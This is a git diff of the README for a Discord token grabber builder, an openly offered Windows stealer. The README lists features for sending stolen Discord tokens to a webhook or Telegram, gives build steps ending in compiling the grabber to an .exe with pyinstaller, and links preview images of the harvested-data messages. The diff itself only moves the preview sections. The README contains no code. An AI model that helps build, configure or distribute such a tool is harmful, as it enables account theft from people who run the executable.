@@ -1,7 +1,7 @@
 # A Discord Token Grabber Builder
 * The original version of the grabber is supported by python 3.6+
 * The builder was tested in python 3.8.6, i do not give any guarantees that it will work on other python versions.
-**Grabber only for Windows.</b></p>**
+* **Grabber only for Windows.</b></p>**
 ***
 # Features
 * No local caching
@@ -13,23 +13,9 @@
 
 * Allows you to send tokens in discord / telegram
 ***
-# Preview
-## Builder:
+# Preview Builder
+
 ![](https://media.discordapp.net/attachments/797823091899236433/799286909092233238/unknown.png?width=1060&height=613)
-***
-### Discord Webhook:
-*`WEBHOOK_STYLE : 1(Slower)`*
-![](https://media.discordapp.net/attachments/769178644697972767/798917458840518696/unknown.png?width=341&height=567)
-***
-*`WEBHOOK_STYLE : 2`*
-![](https://media.discordapp.net/attachments/769178644697972767/798918343061929994/unknown.png)
-***
-### Telegram Message:
-*`TELEGRAM_STYLE : 1(Slower)`*
-![](https://media.discordapp.net/attachments/769178644697972767/798919478548103168/unknown.png)
-***
-*`TELEGRAM_STYLE : 2`*
-![](https://media.discordapp.net/attachments/769178644697972767/798921203824984093/unknown.png)
 ***
 
 # Build Stealer With Builder:
@@ -57,7 +43,23 @@ python builder.py
 5. Change as desired `TELEGRAM_STYLE` to `True`(Slower) or `False`
 ##### Done, now you can compile `token-grabber.py` to `.exe` with [pyinstaller](https://pypi.org/project/pyinstaller/)
 
+# Preview grabber info:
+### Discord Webhook:
+<p align="center">WEBHOOK_STYLE : 1(Slower)</p>
+![](https://media.discordapp.net/attachments/769178644697972767/798917458840518696/unknown.png?width=341&height=567)
 ***
+![](https://media.discordapp.net/attachments/769178644697972767/798918343061929994/unknown.png)
+<p align="center">WEBHOOK_STYLE : 2</p>
+***
+
+### Telegram Message:
+![](https://media.discordapp.net/attachments/769178644697972767/798919478548103168/unknown.png)
+<p align="center">TELEGRAM_STYLE : 1(Slower)</p>
+***
+![](https://media.discordapp.net/attachments/769178644697972767/798921203824984093/unknown.png)
+<p align="center">TELEGRAM_STYLE : 2</p>
+***
+
 ## Author
 - **wodx**
     - [Github](https://github.com/wodxgod)
